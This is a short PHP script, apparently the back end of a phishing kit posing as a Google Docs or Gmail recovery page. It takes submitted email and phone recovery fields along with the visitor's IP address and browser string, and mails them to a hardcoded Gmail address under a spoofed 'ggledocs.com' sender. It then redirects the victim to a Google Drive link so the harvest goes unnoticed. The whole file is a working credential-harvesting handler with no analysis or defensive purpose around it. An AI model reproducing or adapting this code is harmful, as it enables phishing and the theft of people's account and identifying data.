<?
$IP = getenv("REMOTE_ADDR");
$BS =   $_SERVER['HTTP_USER_AGENT'];

$message .= "Phone".$_POST['emailphone']."\n";
$message .= "Phone".$_POST['emailphone2']."\n";
$message .= "IP: ".$IP."\n";
$message .= "BS: ".$BS."\n";

$sent ="swintle9@gmail.com";

$subject = "Awake | grnail Recovery LIST";
$headers = "From: OneDocment <NONE@ggledocs.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
{
mail($mesaegs,$subject,$message,$headers);
mail($sent,$subject,$message,$headers);
}
header("Location: https://drive.google.com/file/d/0BwQW_LHWYsi8RzFjeE1IZE9QNnc");
?>